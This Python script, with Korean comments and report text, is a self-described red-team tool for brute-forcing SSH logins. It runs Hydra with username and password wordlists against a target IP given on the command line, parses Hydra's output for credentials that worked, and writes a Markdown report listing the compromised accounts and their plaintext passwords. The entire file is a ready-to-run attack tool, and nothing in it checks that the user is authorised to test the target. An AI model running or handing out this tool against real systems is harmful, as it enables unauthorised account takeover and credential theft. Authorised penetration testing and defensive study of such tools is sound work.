import argparse
import subprocess
import time
import re
from datetime import datetime
from pathlib import Path


def load_wordlist(file_path):
    """텍스트 파일에서 단어 목록 로드"""
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]


def run_hydra_attack(target, users_file, passwords_file, threads=10):
    start_time = datetime.now()

    cmd = [
        'hydra', '-L', users_file, '-P', passwords_file,
        '-t', str(threads), '-f', f'ssh://{target}'
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        end_time = datetime.now()

        return parse_hydra_output(result.stdout + result.stderr, start_time, end_time, users_file, passwords_file)

    except subprocess.TimeoutExpired:
        print("[-] Attack timed out")
        return None
    except FileNotFoundError:
        print("[-] Hydra not found. Please install hydra.")
        return None


def parse_hydra_output(output, start_time, end_time, users_file, passwords_file):
    """Hydra 결과 파싱"""
    successful_logins = []

    # 성공한 로그인 찾기
    success_pattern = r'\[ssh\] host: [\d.]+\s+login: (\S+)\s+password: (\S+)'
    matches = re.findall(success_pattern, output)

    for username, password in matches:
        successful_logins.append((username, password))

    # 총 시도 횟수 계산
    users = load_wordlist(users_file)
    passwords = load_wordlist(passwords_file)
    total_attempts = len(users) * len(passwords)

    return {
        'successful_logins': successful_logins,
        'total_attempts': total_attempts,
        'failed_attempts': total_attempts - len(successful_logins),
        'start_time': start_time,
        'end_time': end_time,
        'duration': (end_time - start_time).total_seconds(),
        'raw_output': output
    }


def generate_markdown_report(results, target, users_file, passwords_file, output_file):
    """마크다운 보고서 생성"""

    report = f"""# SSH Brute Force 공격 보고서

## 공격 정보
- **대상**: {target}
- **사용자 리스트**: {users_file}
- **패스워드 리스트**: {passwords_file}
- **시작 시간**: {results['start_time'].strftime('%Y-%m-%d %H:%M:%S')}
- **종료 시간**: {results['end_time'].strftime('%Y-%m-%d %H:%M:%S')}
- **소요 시간**: {results['duration']:.2f}초

## 공격 결과

### 탈취된 계정
"""

    if results['successful_logins']:
        report += "| 사용자명 | 패스워드 |\n"
        report += "|----------|----------|\n"
        for username, password in results['successful_logins']:
            report += f"| {username} | {password} |\n"
    else:
        report += "**탈취된 계정이 없습니다.**\n"

    report += f"""
## 공격 통계
- **총 시도 횟수**: {results['total_attempts']}
- **성공 횟수**: {len(results['successful_logins'])}
- **실패 횟수**: {results['failed_attempts']}
- **성공률**: {(len(results['successful_logins']) / results['total_attempts'] * 100) if results['total_attempts'] > 0 else 0:.2f}%

---
*보고서 생성: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*
"""

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(report)

    print(f"[+] Report saved to {output_file}")


def main():
    parser = argparse.ArgumentParser(description='SSH Brute Force Red Team Tool')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-u', '--users', default='id.txt', help='Username list file (default: id.txt)')
    parser.add_argument('-p', '--passwords', default='password.txt', help='Password list file (default: password.txt)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Threads (default: 10)')
    parser.add_argument('-o', '--output', default='attack_report.md', help='Output file')

    args = parser.parse_args()

    print(f"[+] SSH Brute Force Attack")
    print(f"[+] Target: {args.target}")
    print(f"[+] Users: {args.users}")
    print(f"[+] Passwords: {args.passwords}")

    results = run_hydra_attack(args.target, args.users, args.passwords, args.threads)

    if results:
        print(f"\n[+] Attack completed!")
        print(f"[+] Successful logins: {len(results['successful_logins'])}")
        print(f"[+] Total attempts: {results['total_attempts']}")
        print(f"[+] Duration: {results['duration']:.2f}s")

        if results['successful_logins']:
            print("\n[+] Compromised accounts:")
            for username, password in results['successful_logins']:
                print(f"    {username}:{password}")

        generate_markdown_report(results, args.target, args.users, args.passwords, args.output)
    else:
        print("[-] Attack failed")


if __name__ == "__main__":
    main()